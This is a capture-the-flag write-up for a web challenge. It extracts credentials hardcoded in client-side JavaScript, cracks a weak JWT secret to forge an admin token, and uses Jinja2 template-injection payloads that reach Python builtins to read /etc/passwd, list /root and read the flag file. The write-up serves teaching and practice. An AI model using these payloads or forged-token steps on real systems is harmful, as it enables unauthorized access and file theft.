# Boot Sequence - CTF Writeup

**Challenge:** The Orbital Boot Sequence has stalled mid-launch. Can you restart the relay and seize control before the fleet drifts off-course? Submit the root flag for the win.

**Target:** `http://15.206.47.5:8443/`

**Category:** Web Exploitation

---

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Reconnaissance                                            │
│    └─> Examine JavaScript files (secrets.js)                 │
└─────────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────────┐
│ 2. Information Disclosure                                    │
│    └─> Extract credentials from secrets.js                  │
│        Username: flightoperator                              │
│        Password: GlowCloud!93                               │
└─────────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────────┐
│ 3. Initial Access                                           │
│    └─> Login with credentials → Receive operator JWT        │
└─────────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────────┐
│ 4. JWT Analysis & Secret Cracking                           │
│    └─> Decode JWT → Crack secret ("butterfly")              │
└─────────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────────┐
│ 5. Privilege Escalation                                     │
│    └─> Forge admin JWT token                                │
└─────────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────────┐
│ 6. SSTI Discovery                                           │
│    └─> Test {{7*7}} → Confirmed Jinja2 SSTI                 │
└─────────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────────┐
│ 7. RCE via SSTI                                             │
│    └─> Access __globals__ → Use open() to read files        │
└─────────────────────────────────────────────────────────────┘
                        ↓
┌─────────────────────────────────────────────────────────────┐
│ 8. Flag Extraction                                          │
│    └─> Read /root/flag.txt                                  │
└─────────────────────────────────────────────────────────────┘
```

---

## Initial Reconnaissance

Upon accessing the target URL, we're presented with a login page for the "Orbital Boot Sequence" relay system.

![Initial Login Page](./Resources/initial-page.png)

The page contains several JavaScript files that are loaded:
- `/static/js/telemetry.js`
- `/static/js/hud.js`
- `/static/js/secrets.js`
- `/static/js/login.js`

Let's examine these files, particularly `secrets.js` which sounds promising.

---

## Step 1: Finding Hardcoded Credentials

Examining the `secrets.js` file reveals critical information. We can view this file directly in the browser's Network tab or by accessing it via:

```http
GET /static/js/secrets.js HTTP/1.1
Host: 15.206.47.5:8443
```

**Response:**
```javascript
(function () {
  const dustyArchives = [
    {
      sector: "LUNA-IX",
      checksum: "f831d4d00c",
      fallback: "nebula",
    },
    {
      sector: "ORION-LOCK",
      checksum: "92acdd12a9",
      fallback: "solstice",
    },
    {
      sector: "CRADLE-PRIME",
      checksum: "bb92f0021",
      fallback: "midnight",
    },
  ];

  const maintenanceScripts = {
    reboot: [
      "echo \"Cycling arrays\"",
      "sleep 1",
      "echo \"Arrays cycled\"",
    ],
    fallback: "echo \"Manual override required\"",
  };

  const operatorLedger = [
    {
      codename: "relay-spider",
      username: "flightoperator",
      password: "GlowCloud!93",
      privilege: "operator",
    },
    {
      codename: "drift-marauder",
      username: "ghost",
      password: "aLongTimeAgo",
      privilege: "revoked",
    },
    {
      codename: "orbital-miner",
      username: "vector",
      password: "approximation",
      privilege: "revoked",
    },
  ];

  window.__ORBIT_AUTH = {
    dustyArchives,
    maintenanceScripts,
    operatorLedger,
    getPrimary() {
      return operatorLedger[0];
    },
  };
})();
```

**Key Finding:** The `operatorLedger` array contains hardcoded credentials! The first operator has `privilege: "operator"` and active credentials:
- **Username:** `flightoperator`
- **Password:** `GlowCloud!93`

> **Note:** This is a classic example of **information disclosure** - sensitive credentials should never be stored in client-side JavaScript files, as anyone can view the source code.

---

## Step 2: Initial Authentication

Using the discovered credentials, we authenticate via the login API:

```http
POST /api/login HTTP/1.1
Host: 15.206.47.5:8443
Content-Type: application/json

{"username":"flightoperator","password":"GlowCloud!93"}
```

**Response:**
```json
{
  "profile": {
    "displayName": "Relay Operator Iris",
    "role": "operator",
    "username": "flightoperator"
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmbGlnaHRvcGVyYXRvciIsInJvbGUiOiJvcGVyYXRvciIsImlhdCI6MTc2NTY4NDg4MiwiZXhwIjoxNzY1Njg2MDgyfQ.AZ-xsqLSXYoX-UIl6Z4t6OJitwLeebjKmpeqWT1KO_0"
}
```

The login process is handled by `login.js`:

```javascript
async function login(body) {
  const res = await fetch("/api/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({ error: "Login failed" }));
    throw new Error(err.error || "Login failed");
  }
  return res.json();
}

loginForm.addEventListener("submit", async (event) => {
  event.preventDefault();
  const formData = new FormData(loginForm);
  const username = formData.get("username");
  const password = formData.get("password");
  try {
    const response = await login({ username, password });
    sessionStorage.setItem("orbitalToken", response.token);
    sessionStorage.setItem("orbitalProfile", JSON.stringify(response.profile));
    // Redirects to /console
    setTimeout(() => {
      window.location.href = "/console";
    }, 800);
  } catch (error) {
    // Handle error
  }
});
```

We receive a JWT token and are redirected to `/console`. However, we notice that our role is `"operator"`, not `"admin"`. The console page shows an "Admin Beacon" button that is disabled for non-admin users.

---

## Step 3: JWT Token Analysis and Secret Cracking

Let's decode the JWT token to understand its structure:

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "sub": "flightoperator",
  "role": "operator",
  "iat": 1765684882,
  "exp": 1765686082
}
```

The token uses HS256 (HMAC-SHA256), which means we need the secret key to forge tokens. Let's attempt to crack the JWT secret.

Using tools like `hashcat` or `jwt-crack`, we discover the secret: **`butterfly`**

![JWT Secret Cracking](./Resources/jwt-cracked.png)

---

## Step 4: Forging Admin JWT Token

Now that we have the secret, we can forge a new JWT token with `role: "admin"`:

**New Payload:**
```json
{
  "sub": "admin",
  "role": "admin",
  "iat": 1765684882,
  "exp": 1765686082
}
```

Using the secret `butterfly`, we generate a new admin token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc2NTY4NjAxMiwiZXhwIjoxNzY1Njg5MDgyfQ.GjcDvY5x1ujAOk-CGZDgpJzj9n4G-o3o6YrgszHD1io
```

![JWT Token Tampering](./Resources/jwt-tampered.png)

We update the token in `sessionStorage` and refresh the page. The Admin Beacon panel is now accessible!

![Admin Token](./Resources/admin-panel.png)

---

## Step 5: Understanding the Admin Beacon

The Admin Beacon form requires two inputs:
1. **Instruction template** - A textarea for the message
2. **Checksum signature** - A checksum that must match the message

Looking at the `console.js` file, we find the checksum calculation function:

```javascript
function computeChecksum(payload, token) {
  const buffer = `${payload || ""}::${token || "guest-orbital"}`;
  let acc = 0x9e3779b1;
  for (let i = 0; i < buffer.length; i += 1) {
    const code = buffer.charCodeAt(i);
    const shift = i % 5;
    acc ^= (code << shift) + (code << 12);
    acc = (acc + ((acc << 7) >>> 0)) ^ (acc >>> 3);
    acc = acc >>> 0;
    acc ^= (acc << 11) & 0xffffffff;
    acc = acc >>> 0;
  }
  return (acc >>> 0).toString(16).padStart(8, "0");
}

window.hyperpulseChecksum = computeChecksum;
```

The function is exposed globally as `window.hyperpulseChecksum`, making it easy to calculate checksums in the browser console.

The form submits to `/api/admin/hyperpulse`:

```javascript
const res = await fetch("/api/admin/hyperpulse", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    Authorization: `Bearer ${sessionToken}`,
  },
  body: JSON.stringify({ message, checksum }),
});
```

---

## Step 6: Discovering Server-Side Template Injection (SSTI)

The form mentions "Instruction template", which suggests template rendering. This is a red flag for potential **Server-Side Template Injection (SSTI)** vulnerabilities.

Let's test for template injection by attempting to execute a simple mathematical expression. First, we calculate the checksum for a test payload using the browser console:

```javascript
// In browser console on /console page
const token = sessionStorage.getItem("orbitalToken");
const message = "{{7*7}}";
const checksum = window.hyperpulseChecksum(message, token);
console.log("Checksum:", checksum); // Output: 7f2169b6
```

![Checksum Generation](./Resources/checksum-gen.png)
*Calculating the checksum for our SSTI test payload*

Submitting the payload:

```http
POST /api/admin/hyperpulse HTTP/1.1
Host: 15.206.47.5:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{"message":"{{7*7}}","checksum":"7f2169b6"}
```

**Response:**
```json
{
  "reference": {
    "now": "2025-12-14T04:26:54.478416",
    "pilot": "Nova-17",
    "systems": ["Life Support", "Payload Bay", "Thermal Shields"]
  },
  "result": "49"
}
```

**Success!** The template `{{7*7}}` was evaluated and returned `49`, confirming **Jinja2 Server-Side Template Injection (SSTI)**.

> **Why this works:** The server is using Jinja2 templates and directly rendering user input without sanitization. The double curly braces `{{ }}` are Jinja2's expression delimiters, allowing us to inject arbitrary Python expressions.

---

## Step 7: Exploiting SSTI for Code Execution

Now we need to escape the template sandbox and execute arbitrary Python code. We'll use the classic Jinja2 SSTI payload to access Python's built-in functions.

### Step 7.1: Accessing Global Context

To escape the template sandbox, we need to access Python's built-in functions. We use the classic Jinja2 SSTI payload:

```javascript
const message = "{{ self.__init__.__globals__ }}";
const checksum = window.hyperpulseChecksum(message, token);
```

This payload works by:
1. `self` - References the current template context
2. `__init__` - Accesses the initialization method
3. `__globals__` - Accesses the global namespace containing all imported modules and built-ins

The response reveals the global context, confirming we're in a Jinja2 environment with access to Python built-ins like `__import__`, `open`, `eval`, etc.

### Step 7.2: Reading Files

We can use Python's `open()` function to read files:

```javascript
const message = "{{ self.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}";
const checksum = window.hyperpulseChecksum(message, token);
```

**Response snippet:**
```
root:x:0:0:root:/root:/bin/bash
...
orbital:x:1000:1000::/home/orbital:/bin/sh
```

### Step 7.3: Listing Root Directory

Let's check what's in `/root`:

```javascript
const message = "{{ self.__init__.__globals__['__builtins__']['__import__']('os').listdir('/root') }}";
const checksum = window.hyperpulseChecksum(message, token);
```

**Response:**
```json
{
  "result": "['.bashrc', '.profile', 'flag.txt', '.python_history', '.wget-hsts']"
}
```

Perfect! There's a `flag.txt` file in `/root`.

### Step 7.4: Reading the Flag

Now we read the flag:

```javascript
const message = "{{ self.__init__.__globals__['__builtins__']['open']('/root/flag.txt').read() }}";
const checksum = window.hyperpulseChecksum(message, token);
```

**Final Request:**
```http
POST /api/admin/hyperpulse HTTP/1.1
Host: 15.206.47.5:8443
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{"message":"{{ self.__init__.__globals__['__builtins__']['open']('/root/flag.txt').read() }}","checksum":"0f98c5e2"}
```

![Final Burp Request](./Resources/burp-final.png)
*Final SSTI payload to read the flag*

**Response:**
```json
{
  "reference": {
    "now": "2025-12-14T04:44:58.526330",
    "pilot": "Nova-17",
    "systems": ["Life Support", "Payload Bay", "Thermal Shields"]
  },
  "result": "ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}\n"
}
```

---

## Flag

```
ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}
```

---

### Resources Used

- [JWT Tool](https://github.com/ticarpi/jwt_tool)
- [Jinja2 SSTI Payloads](https://github.com/payloadbox/ssti-payloads)

---